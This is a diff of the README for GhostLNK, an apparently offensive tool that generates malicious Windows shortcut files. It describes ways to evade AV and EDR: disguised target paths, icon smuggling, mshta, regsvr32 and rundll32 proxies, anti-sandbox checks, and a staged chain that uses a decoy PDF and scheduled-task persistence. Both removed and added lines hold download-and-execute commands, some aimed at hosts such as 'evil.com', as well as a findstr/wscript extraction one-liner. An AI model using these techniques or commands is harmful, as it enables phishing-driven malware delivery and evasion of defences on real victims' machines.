@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&duration=3000&pause=500&color=6A1F7A&center=true&vCenter=true&width=600&lines=GhostLNK;Advanced+LNK+Generator+%2B+Evasion;Kimsuky+Inspired+Tradecraft" alt="GhostLNK" />
+  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&duration=3000&pause=500&color=6A1F7A&center=true&vCenter=true&width=700&lines=GhostLNK;Advanced+LNK+Generator;Multi‑Stage+%7C+Icon+Smuggling+%7C+LotL" alt="GhostLNK" />
 </p>
 
 <p align="center">
@@ -19,51 +19,49 @@
 
 ## 🧬 Overview
 
-**GhostLNK** is a state‑of‑the‑art Windows LNK (shortcut) generator that blends advanced evasion, modular staging, and a retro‑inspired interface. It equips red teams and security researchers with the tools to simulate nation‑state tradecraft—bypassing modern EDR signatures while maintaining convincing disguises.
+**GhostLNK** is a professional‑grade Windows LNK (shortcut) generator that incorporates advanced tradecraft to help operators reduce detection surface. It supports multi‑stage execution, icon smuggling, LotL proxies, and anti‑sandbox checks, providing a flexible toolkit for red team operations and security research.
 
 > [!IMPORTANT]
-> This tool is intended **exclusively** for authorized security testing, education, and research. Unauthorized use is strictly prohibited.
+> GhostLNK is intended **exclusively** for authorized security testing, red team operations, and educational research. Misuse is strictly prohibited.
 
 ---
 
-## 🧰 Key Features
+## 🚀 Key Features
 
-### 🚀 Core Payload Engines
-
+### 🧩 Payload Generation
 | Mode | Description |
 |------|-------------|
-| 📥 **Download & Open** | Fetch a remote file, save to temp, and open with default app. |
-| ⚡ **Memory Execute** | Run a PowerShell script directly in memory—no disk footprint. |
-| 🥷 **Ultra Stealth** | Minimal output, heavily obfuscated commands for maximum AV evasion. |
-| 🎯 **Raw Target** | Bypass PowerShell entirely: run any EXE with custom arguments. |
+| **Download & Open** | Downloads a remote file to `%TEMP%` and opens it with the default application. |
+| **Memory Execute** | Runs a PowerShell script entirely in memory – no disk footprint. |
+| **Ultra Stealth** | Minimal, obfuscated PowerShell commands to reduce signature exposure. |
+| **Raw Target** | Launches any executable directly, bypassing PowerShell completely. |
 
-### 🛡️ Advanced Evasion (Kimsuky‑Inspired)
-
-| Technique | Effect |
-|-----------|--------|
-| 🔀 **conhost.exe Proxy** | Launches PowerShell via the trusted `conhost.exe` to defeat parent‑process monitoring. |
-| 🎭 **LNK Stomping** | Spoofs the displayed target path (e.g., `invoice.pdf`) while executing the real payload. |
-| 📡 **regsvr32 Proxy** | Fileless execution of remote SCT/DLL using `regsvr32.exe`. |
-| 🧩 **Multi‑Stage Stager** | LNK → hidden VBS → decoy PDF → scheduled task → final payload. |
-| 🔐 **XOR Encoding** | Encrypts embedded scripts with a user‑supplied key. |
-| 🧵 **String Obfuscation** | Splits suspicious strings (`powershell` → `('po'+'wer'+'she'+'ll')`). |
+### 🛡️ Advanced Techniques
+| Technique | Description |
+|-----------|-------------|
+| **Multi‑Stage Stager** | LNK → drops VBS → opens decoy PDF → creates scheduled task → executes final payload. Fragments the attack chain into benign‑looking steps. |
+| **True Icon Smuggling** | Embeds encrypted payload inside the LNK's `IconEnvironmentDataBlock`. The LNK target is `notepad.exe` (clean command line). A separate extractor VBS is saved alongside. |
+| **Self‑Extracting LNK** | Appends a VBS extractor between markers. The LNK runs `cmd.exe /c findstr ...` to extract and execute it with `wscript`. No PowerShell in arguments, reducing static signature exposure. |
+| **Binary Icon Smuggling** | Appends a self‑contained VBS script to the LNK. Target = `wscript.exe //B` with the LNK itself as argument. |
+| **LotL Proxies** | Use trusted Windows binaries to launch payloads: `mshta.exe` (remote HTA), `rundll32.exe` (JavaScript), `regsvr32.exe` (fileless SCT), `conhost.exe` (parent process spoofing). |
+| **LNK Stomping** | Spoofs the displayed target path (e.g., `C:\Windows\System32\notepad.exe`) while the real command executes. |
+| **Anti‑Sandbox** | Checks for VM and analysis tool processes and terminates if detected. |
+| **XOR Encoding & String Obfuscation** | Encrypts payloads and breaks suspicious strings (`powershell` → `('po'+'wer'+'she'+'ll')`). |
 
 ### 🎚️ Stealth Levels
-
-| Level | Behavior | AV Evasion |
-|-------|----------|------------|
-| **0 – Normal** | Standard output, visible window | Low |
-| **1 – Moderate** | PowerShell aliases, no obvious flags | Medium |
-| **2 – Maximum** | Obfuscated code, no `-WindowStyle Hidden` | High |
+| Level | Behavior |
+|-------|----------|
+| **0 – Normal** | Standard PowerShell output, visible window. |
+| **1 – Moderate** | PowerShell aliases, minimized window (`-W 1`). |
+| **2 – Maximum** | Obfuscated code, minimal flags, no `-WindowStyle Hidden`. |
 
 ### 🖥️ Professional Interface
-
-- **Two‑Column Header** – Title & credits on the left, live console on the right.
-- **Neon Matrix Aesthetic** – High‑contrast monospaced theme for readability.
+- **Two‑Column Header** – Title and console output side‑by‑side.
+- **Neon Matrix Aesthetic** – High‑contrast, monospaced theme.
 - **Step‑by‑Step Workflow** – Numbered stages with visual progress indicators.
-- **Smart Conflict Resolution** – Incompatible options auto‑disable with tooltip explanations.
-- **Live Dropbox Validation** – Instant feedback on `dl=1` parameter.
-- **Icon Masquerading** – 8+ realistic file icons (PDF, Word, Excel, etc.).
+- **Smart Conflict Resolution** – Incompatible options auto‑disable with tooltips.
+- **Live Dropbox Validation** – Checks for `dl=1` parameter.
+- **Icon Masquerading** – 8+ realistic file icons.
 - **Recent History** – Quick recall of previous URLs and conversions.
 
 ---
@@ -74,7 +72,7 @@
 - **Python 3.8+**
 - **Windows OS** (LNK generation requires Windows API structures)
 
-### One‑Liner Setup
+### Quick Setup
 ```bash
 git clone https://github.com/Excalibra/GhostLNK.git
 cd GhostLNK
@@ -82,64 +80,66 @@ pip install PyQt6 pylnk3   # Auto‑installed on first run if missing
 python ghostlnk.py
 ```
 
-> GhostLNK automatically installs missing dependencies when launched.
+GhostLNK automatically installs missing dependencies when launched.
 
 ---
 
 ## 🧪 Usage Guide
 
-### 🚀 Quick Start (PowerShell Payload)
-
+### 🚀 Basic Workflow (PowerShell Payload)
 1. **Enter URL** – e.g., a Dropbox link with `&dl=1`.
 2. **Choose Payload Type** – Download & Open, Memory Execute, or Ultra Stealth.
-3. **Set Stealth Level** – 0 (normal) to 2 (maximum obfuscation).
+3. **Set Stealth Level** – 0 (normal) to 2 (maximum).
 4. **Execution Options** – Pause, debug, or hide window.
 5. **Generate** – Follow the numbered buttons: Show → Encode → Copy → Use.
 
-```
-[1] Show Command   → preview
-[2] Encode         → base64
-[3] Copy -E        → clipboard
-[4] Use in LNK     → load into generator
-```
-
-### 🔧 Raw Target Mode
+### 🎯 Raw Target Mode
 Enable **Raw Target Mode** to launch any executable directly:
 ```
 Target: C:\Windows\System32\mshta.exe
-Args:   "https://evil.com/payload.hta"
+Args:   "https://example.com/payload.hta"
 ```
 
 ### 🧬 Embedded Payload (No Network)
-Paste a PowerShell script directly into the **Embedded Payload** area. Enable XOR encoding or string obfuscation for extra stealth. The generated LNK contains a self‑decoding stub that runs entirely from the command line.
+Paste a PowerShell script into the **Embedded Payload** area. Enable **XOR Encode** or **String Obfuscation** for extra stealth. Choose from several delivery methods:
 
-### 🧩 Multi‑Stage Stager (Kimsuky Style)
+| Method | How It Works |
+|--------|--------------|
+| **Append Mode** | Payload appended to LNK; extracted via obfuscated PowerShell reflection stub. |
+| **Binary Smuggling** | VBS extractor + payload appended; target = `wscript.exe //B`. |
+| **True Icon Smuggling** | Payload in `IconEnvironmentDataBlock`; target = `notepad.exe`. Extractor VBS saved separately. |
+| **Self‑Extracting LNK** | VBS extractor appended between markers; `cmd.exe` + `findstr` extracts and runs with `wscript`. |
+
+### 🔧 Multi‑Stage Stager
 1. Check **Multi‑Stage Stager**.
-2. Provide a **Decoy PDF URL** (opened immediately).
-3. Provide the **Final Payload URL** (executed via scheduled task).
+2. Provide **Decoy PDF URL** (opened immediately).
+3. Provide **Final Payload URL** (executed via scheduled task).
 The LNK drops a VBS script in a hidden folder, opens the decoy, and creates a persistent scheduled task with a random GUID name.
+
+### 🌐 LotL Proxies
+Select a proxy binary and provide the required URL/script:
+- **mshta.exe** → `http://server/payload.hta`
+- **rundll32.exe** → JavaScript payload
+- **regsvr32.exe** → `http://server/payload.sct`
+- **conhost.exe** – Used automatically when "Use conhost.exe as proxy" is checked (PowerShell mode only)
 
 ---
 
-## 🧠 Stealth Deep Dive
+## 🧠 Design Philosophy
 
-### Why Stealth Matters
-EDRs and AVs flag:
-- `-WindowStyle Hidden` flags
-- Long, high‑entropy Base64 strings
-- Suspicious parent‑child process relationships
+GhostLNK incorporates techniques observed in modern attack chains to help reduce the likelihood of static and behavioral detection:
+- **Removing PowerShell from command lines** – Self‑Extracting and True Icon Smuggling methods rely on `cmd.exe`, `wscript.exe`, and benign targets.
+- **Hiding payloads in binary structures** – The `IconEnvironmentDataBlock` is not parsed by traditional signature scanners.
+- **Fragmenting execution** – Multi‑Stage Stager splits the attack into smaller, seemingly legitimate actions.
 
-### Maximum Stealth (Level 2) Example
-```powershell
-# Instead of:
-powershell.exe -WindowStyle Hidden -E SQBFAFgAIAAoAE4AZ...
+These approaches are not silver bullets but are designed to raise the bar for detection.
 
-# GhostLNK Level 2 produces:
-powershell.exe -E SQBFAFgAIAAoAE4AZ...   # Payload internally uses iex (wget -useb ...)
+### Self‑Extracting LNK (cmd + findstr + wscript)
 ```
-
-### LNK Stomping in Action
-The LNK’s internal `LinkTargetIDList` is deliberately malformed. Windows Explorer “corrects” the displayed path to a benign file (e.g., `C:\Users\Public\Documents\invoice.pdf`), while the actual command still executes.
+Target:   C:\Windows\System32\cmd.exe
+Arguments: /c findstr /v "^-----" "%~f0" > "%TEMP%\e.vbs" & wscript //B "%TEMP%\e.vbs"
+```
+The LNK file contains a VBS script wrapped between `-----BEGIN VBS-----` and `-----END VBS-----` markers, followed by the encrypted payload. `findstr` extracts the script, `wscript` executes it, and the VBS decrypts and runs the PowerShell payload. This method avoids placing PowerShell directly in the LNK arguments.
 
 ---
 
@@ -163,37 +163,12 @@ ICON_DATABASE = {
 
 ---
 
-## 🧬 Payload Examples
-
-### Download & Open (Level 2)
-```powershell
-$u="https://dropbox.com/file.pdf?dl=1";$t=[IO.Path]::GetTempPath();$f=[IO.Path]::Combine($t,"doc.pdf");(New-Object Net.WebClient).DownloadFile($u,$f);Start "$f";
-```
-
-### Memory Execute (Level 2)
-```powershell
-iex (wget -useb "https://your-server.com/script.ps1");
-```
-
-### Raw Target (mshta)
-```
-Target: C:\Windows\System32\mshta.exe
-Args:   "https://example.com/update.hta"
-```
-
-### Multi‑Stage Stager Output
-- **LNK**: runs PowerShell that creates `%APPDATA%\Microsoft\MicrosoftEdge_XXXXX\update.vbs`
-- **VBS**: opens decoy PDF and schedules a hidden task
-- **Task**: executes `iex (iwr 'http://payload/launcher.ps1')`
-
----
-
 ## 🧰 Troubleshooting
 
 | Symptom | Likely Fix |
 |---------|------------|
 | LNK doesn't execute | Verify URL accessibility and `dl=1` on Dropbox. |
-| AV still detects | Increase stealth to Level 2, use Memory Execute, or enable **regsvr32** / **Multi‑Stage**. |
+| Detection still occurs | Try **Self‑Extracting LNK** or **True Icon Smuggling** for reduced signature exposure. |
 | GUI won't start | `pip install PyQt6 pylnk3` manually. |
 | Buttons stay grayed out | Update to latest code; conflict logic was refined. |
 | Import doesn't add `-E` | Click the **Import** button after pasting. |
@@ -204,7 +179,7 @@ Args:   "https://example.com/update.hta"
 
 - [Microsoft LNK Format](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
 - [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
-- [Red Team LNK Tradecraft](https://redteam.guide/docs/Execution/LNK)
+- [MITRE T1027.012 – LNK Icon Smuggling](https://attack.mitre.org/techniques/T1027/012/)
 
 ---
 
@@ -213,6 +188,7 @@ Args:   "https://example.com/update.hta"
 > [!CAUTION]
 > GhostLNK is **only** for:
 > - ✅ Authorized penetration testing
+> - ✅ Red team operations with explicit permission
 > - ✅ Educational demonstrations
 > - ✅ Defensive research
 >
@@ -234,12 +210,11 @@ Args:   "https://example.com/update.hta"
 
 - **pylnk3** for core LNK manipulation
 - The security research community for continuous inspiration
-- APT tradecraft that drives defensive innovation
 
 ---
 
 <p align="center">
-  <b>GhostLNK – Evasion at the Edge of Tradecraft</b><br>
+  <b>GhostLNK – Advanced LNK Crafting for Red Teams</b><br>
   <sub>For authorized use only</sub>
 </p>
 
